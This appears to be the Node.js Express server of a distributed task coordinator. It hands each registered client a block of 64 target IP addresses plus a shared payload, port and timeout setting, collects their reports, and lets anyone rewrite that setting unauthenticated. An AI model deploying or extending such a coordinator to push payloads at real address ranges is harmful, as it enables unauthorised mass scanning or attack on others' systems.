const express = require('express');
const { v4 } = require('uuid');
const storage = require('./storage');

const app = express();
const config = {
  Enabled: false, Payload: "", Port: 0, Timeout: 1000,
};
const reports = {};

app.use(express.json());
app.use(express.static('public/'));

app.get('/config', (_, res) => {
  res.json(config);
});

app.post('/config', (req, res) => {
  Object.assign(config, req.body);
  res.sendStatus(200);
});

app.get('/xhr', (_, res) => {
  res.json(reports);
});

app.post('/update/:uuid', (req, res) => {
  reports[req.params.uuid] = req.body;
  res.json(Object.assign({
    UUID: req.params.uuid,
    IPs: storage.getValue(req.params.uuid),
  }, config));
});

app.get('/renew/:uuid/:ip', async (req, res) => {
  const orig = storage.getValue(req.params.uuid);
  const indx = orig.indexOf(req.params.ip);
  if (indx === -1) {
    return res.sendStatus(400);
  }
  orig.splice(indx, 1);
  const newip = storage.getNextIp();
  orig.push(newip);
  await storage.setValue(req.params.uuid, orig);
  return res.send(newip);
});

app.post('/register', async (_, res) => {
  const newUUID = v4();
  const newTargets = [];
  for (let i = 0; i < 64; i++) {
    newTargets.push(storage.getNextIp());
  }
  await storage.setValue(newUUID, newTargets);
  console.log('register: assigned', newTargets[0], '-', newTargets[newTargets.length-1], 'to', newUUID);
  res.json(Object.assign({
    UUID: newUUID,
    IPs: newTargets,
  }, config));
});

storage.init().then(() => {
  app.listen(process.env.NODE_PORT || 80, () => {
    console.log('init: done');
  });
});
